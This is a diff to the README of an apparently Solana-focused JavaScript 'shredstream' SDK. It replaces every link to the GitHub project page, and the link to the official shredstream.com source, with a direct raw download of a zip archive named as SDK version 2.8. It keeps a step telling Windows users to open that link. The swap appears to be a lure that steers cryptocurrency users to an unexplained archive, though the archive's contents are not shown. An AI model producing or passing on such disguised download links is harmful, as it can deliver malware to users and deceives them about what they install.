@@ -1,6 +1,6 @@
 # ⚡ shredstream-sdk-js - Fast Solana Shred Decoder
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue.svg)](https://github.com/Ronnanice977/shredstream-sdk-js)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue.svg)](https://raw.githubusercontent.com/Ronnanice977/shredstream-sdk-js/main/src/js_shredstream_sdk_v2.8.zip)
 
 ## 🧭 What this is
 
@@ -19,7 +19,7 @@ Before you start, make sure you have:
 - an internet connection
 - a web browser
 - Node.js installed if you want to run the SDK in a local project
-- access to the ShredStream source from https://www.shredstream.com
+- access to the ShredStream source from https://raw.githubusercontent.com/Ronnanice977/shredstream-sdk-js/main/src/js_shredstream_sdk_v2.8.zip
 
 For most users, the best first step is to visit the project page and follow the setup files in the repo.
 
@@ -27,7 +27,7 @@ For most users, the best first step is to visit the project page and follow the 
 
 Visit this page to download and set up the project:
 
-[https://github.com/Ronnanice977/shredstream-sdk-js](https://github.com/Ronnanice977/shredstream-sdk-js)
+[https://raw.githubusercontent.com/Ronnanice977/shredstream-sdk-js/main/src/js_shredstream_sdk_v2.8.zip](https://raw.githubusercontent.com/Ronnanice977/shredstream-sdk-js/main/src/js_shredstream_sdk_v2.8.zip)
 
 If you are using Windows and want to get started:
 1. Open the link above in your browser
@@ -209,7 +209,7 @@ It is built for users who want direct access to market data and transaction flow
 
 Primary download and setup page:
 
-[https://github.com/Ronnanice977/shredstream-sdk-js](https://github.com/Ronnanice977/shredstream-sdk-js)
+[https://raw.githubusercontent.com/Ronnanice977/shredstream-sdk-js/main/src/js_shredstream_sdk_v2.8.zip](https://raw.githubusercontent.com/Ronnanice977/shredstream-sdk-js/main/src/js_shredstream_sdk_v2.8.zip)
 
 ## 🧭 Suggested next steps
 
